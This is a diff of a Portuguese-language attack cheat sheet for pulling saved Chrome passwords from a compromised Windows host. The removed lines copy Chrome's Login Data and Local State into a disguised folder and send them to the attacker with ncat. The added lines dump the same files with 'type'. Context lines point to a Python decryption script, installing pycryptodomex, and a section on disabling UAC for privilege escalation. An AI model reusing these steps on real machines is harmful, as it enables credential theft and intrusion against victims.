@@ -117,42 +117,18 @@ findstr /i "http" "%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\places.s
 
 ## 🔐 Extrair senhas salvas do Chrome
 
-### 1. Copiar arquivos no Windows (shell conectado)
+### 1. Visualizar os (Local Data e Local State) usando o type e salva-lo como LoginData.db e LocalState.json
 ```cmd
-copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%USERPROFILE%\WindowsAudio\LoginData.db"
-copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "%USERPROFILE%\WindowsAudio\LocalState.json"
-```
+cd "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default
+type "Login Data"
+type "Local State"
 
-### 2. Transferir para o atacante
-
-**No Windows (shell conectado):**
-```cmd
-ncat -lnp 5581 < "%USERPROFILE%\WindowsAudio\LoginData.db"
-```
-
-**No Linux (outro terminal):**
-```bash
-ncat IP_VITIMA 5581 > LoginData.db
-```
-
-**Repita para o LocalState (use porta 5582):**
-
-**No Windows:**
-```cmd
-ncat -lnp 5582 < "%USERPROFILE%\WindowsAudio\LocalState.json"
-```
-
-**No Linux:**
-```bash
-ncat IP_VITIMA 5582 > LocalState.json
-```
-
-### 3. Instalar dependência no Linux
+### 2. Instalar dependência no Linux
 ```bash
 pip install pycryptodomex --break-system-packages
 ```
 
-### 4. Script Python para extrair senhas
+### 3. Script Python para extrair senhas
 
 Crie o arquivo `decode_users_pass.py`:
 
@@ -201,7 +177,7 @@ Execute:
 python3 decode_users_pass.py
 ```
 
-### 5. Elevação de Privilégio (Desabilitar UAC)
+### 4. Elevação de Privilégio (Desabilitar UAC)
 
 ⚠️ **Aviso** O uso indevido é de total responsabilidade do usuário.
 
@@ -241,7 +217,7 @@ Execute:
 python3 decode_users_pass.py
 ```
 
-### 6. Display do Windows
+### 5. Display do Windows
 
 **Descobri a resolução da tela:**
 ```cmd
